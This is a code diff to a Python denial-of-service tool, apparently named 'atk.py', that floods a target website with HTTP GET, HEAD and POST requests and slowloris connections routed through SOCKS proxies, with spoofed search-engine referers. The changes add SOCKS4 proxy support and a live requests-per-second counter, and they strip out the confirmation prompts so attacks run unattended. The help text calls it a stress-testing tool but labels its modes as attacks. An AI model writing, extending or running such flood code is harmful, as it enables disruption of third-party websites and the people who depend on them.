@@ -53,6 +53,7 @@ referers = [
 	"https://www.google.co.ao/search?q=",
 ]
 ind_dict = {}
+lastRpsTotal = 0
 data = ""
 cookies = ""
 strings = "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890&"
@@ -202,15 +203,23 @@ def SetupIndDict():
 		ind_dict[proxy.strip()] = 0
 
 def OutputToScreen(ind_rlock):
-	global ind_dict
-	i = 0
-	while 1:
-		ind_rlock.acquire()
-		total_rps = sum(ind_dict.values())
-		ind_rlock.release()
-		i+=1
-		print(str(i)+" Total Rps:"+str(total_rps))
-		time.sleep(2)
+    global ind_dict
+    global lastRpsTotal
+    i = 0
+    while True:
+        ind_rlock.acquire()
+        try:
+            nowRpsTotal = sum(ind_dict.values())
+        finally:
+            ind_rlock.release()
+
+        # 计算这段时间的新增请求数（当前总数 - 上一次的总数）
+        delta = nowRpsTotal - lastRpsTotal
+        lastRpsTotal = nowRpsTotal
+
+        i += 1
+        print(f"{i} Current RPS: {delta}")
+        time.sleep(3)  # 每 3 秒统计一次
 
 def cc(event,socks_type,ind_rlock):
 	global ind_dict
@@ -223,7 +232,8 @@ def cc(event,socks_type,ind_rlock):
 	while True:
 		try:
 			s = socks.socksocket()
-			s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
+			if socks_type == 5:
+				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
 			if brute:
 				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
 			s.connect((str(target), int(port)))
@@ -261,7 +271,10 @@ def head(event,socks_type,ind_rlock):#HEAD MODE
 	while True:
 		try:
 			s = socks.socksocket()
-			s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
+			if socks_type == 4:
+				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
+			if socks_type == 5:
+				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
 			if brute:
 				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
 			s.connect((str(target), int(port)))
@@ -296,7 +309,10 @@ def post(event,socks_type,ind_rlock):
 	while True:
 		try:
 			s = socks.socksocket()
-			s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
+			if socks_type == 4:
+				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
+			if socks_type == 5:
+				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
 			if brute:
 				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
 			s.connect((str(target), int(port)))
@@ -362,7 +378,10 @@ def slow(conn,socks_type):
 		proxy = Choice(proxies).strip().split(":")
 		for _ in range(conn - len(socket_list)):
 			try:
-				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
+				if socks_type == 4:
+					s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
+				if socks_type == 5:
+					s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
 				s.settimeout(1)
 				s.connect((str(target), int(port)))
 				if int(port) == 443:
@@ -401,7 +420,10 @@ def checking(lines,socks_type,ms,rlock,):
 			break
 		try:
 			s = socks.socksocket()
-			s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
+			if socks_type == 4:
+				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
+			if socks_type == 5:
+				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
 			s.settimeout(ms)
 			s.connect((str(target), int(port)))
 			if protocol == "https":
@@ -464,7 +486,7 @@ def main():
 
 	parser = argparse.ArgumentParser(
 	description="压力测试工具参数配置",
-	epilog="使用示例: python3 atk.py cc https://example.com 1000 100"
+	epilog="使用示例: python3 atk.py cc/post/head/slow/check https://example.com 1000 100"
 	)
 	# 必需参数
 	parser.add_argument('mode', type=str, choices=['cc', 'post', 'head', 'slow', 'check'], help="攻击模式: [cc/post/head/slow/check]")
@@ -487,7 +509,7 @@ def main():
 	url = args.url.strip()
 	ParseUrl(url)
 	if mode == "post":
-		mode2 = InputOption("> Customize post data? (y/n, default=n):",["y","n","yes","no"],"n")
+		mode2 = "n"
 		if mode2 == "y":
 			data = open(str(input("> Input the file's path:")).strip(),"r",encoding="utf-8", errors='ignore').readlines()
 			data = ' '.join([str(txt) for txt in data])
@@ -517,7 +539,6 @@ def main():
 		return
 	ind_rlock = threading.RLock()
 	if mode == "slow":
-		input("Press Enter to continue.")
 		th = threading.Thread(target=slow,args=(thread_num,socks_type,))
 		th.setDaemon(True)
 		th.start()
